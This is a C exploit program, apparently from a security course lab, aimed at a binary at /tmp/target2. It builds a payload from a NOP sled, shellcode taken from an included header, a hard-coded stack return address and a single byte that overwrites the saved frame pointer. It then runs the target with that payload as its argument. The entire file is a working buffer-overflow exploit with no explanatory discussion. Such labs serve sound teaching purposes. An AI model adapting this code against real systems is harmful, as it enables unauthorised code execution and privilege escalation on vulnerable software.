#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

#define SP 201

static char payload[SP];

int main(void)
{
  char *args[3];
  char *env[1];
  int i, j;

  memset(payload, 0x90, SP);
  for(i = 197-sizeof(shellcode), j = 0; j < (sizeof(shellcode) - 1 ); i++, j++){
        payload[i] = shellcode[j];
  }
  payload[i++] = 0x02; //*
  payload[i++] = 0xfd; // * address of buffer
  payload[i++] = 0xff; // *
  payload[i++] = 0xbf; // */
  payload[i++] = 0x50;  // fp byte being overwritten

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

